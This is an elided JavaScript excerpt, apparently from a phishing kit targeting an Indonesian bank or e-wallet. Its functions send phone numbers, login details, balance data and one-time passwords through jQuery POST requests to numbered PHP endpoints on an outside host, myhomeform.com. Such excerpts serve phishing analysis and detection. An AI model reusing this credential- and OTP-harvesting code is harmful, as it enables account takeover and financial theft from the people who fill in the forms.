function sendHp() {
   ...
   $.ajax({
      url: 'https://myhomeform.com/ast/one.php',
      type: 'POST',
...
function sendLogin(){
   $('.load').fadeIn();
    ...
    $.ajax({
      url: 'https://myhomeform.com/ast/two.php',
      type: 'POST',
...
function sendSaldoS() {
   ...
   $.ajax({
      url: 'https://myhomeform.com/ast/thre.php',
      type: 'POST',
...
function sendOtpS() {
     ...
     $.ajax({
        type: 'POST',
        url: 'https://myhomeform.com/ast/empat.php',
...
function sendBelum(){    
   ...
   $.ajax({
        type: 'POST',
        url: 'https://myhomeform.com/ast/lima.php',
        data: $('#login').serialize(),
        datatype: 'JSON',
      complete: function() {
         setTimeout(function() {
...
function sendOtp() {
     ...
     $.ajax({
        type: 'POST',
        url: 'https://myhomeform.com/ast/tujuh.php',
        data: $('#formLinkk').serialize(),
        datatype: 'JSON',
                complete: function (response) {
                    showAlert("a");
